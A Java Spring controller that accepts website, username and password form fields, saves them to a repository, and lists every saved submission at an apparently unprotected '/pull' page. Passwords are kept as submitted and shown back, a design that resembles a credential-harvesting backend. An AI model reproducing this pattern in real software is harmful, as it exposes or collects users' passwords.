package com.example.application.controller;

import com.example.application.repository.SubmissionRepository;
import com.example.application.modelDTO.Submission;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;

@Controller
public class SubmissionController {

    @Autowired
    private SubmissionRepository submissionRepository;

    @GetMapping("/")
    public String showForm() {
        return "index";
    }

    @PostMapping("/submit")
    public String submitForm(String website, String username, String password) {
        long submissionTime = System.currentTimeMillis() / 1000;
        
        Submission submission = new Submission();
        submission.setSubmissionTime(submissionTime);
        submission.setWebsite(website);
        submission.setUsername(username);
        submission.setPassword(password);
        
        submissionRepository.save(submission);

        return "redirect:/thankyou";
    }

    @GetMapping("/thankyou")
    public String showThankYouPage() {
        return "thankyou";
    }

    @GetMapping("/pull")
    public String showSubmissions(Model model) {
        Iterable<Submission> submissions = submissionRepository.findAll();
        model.addAttribute("submissions", submissions);
        return "pull";
    }


}
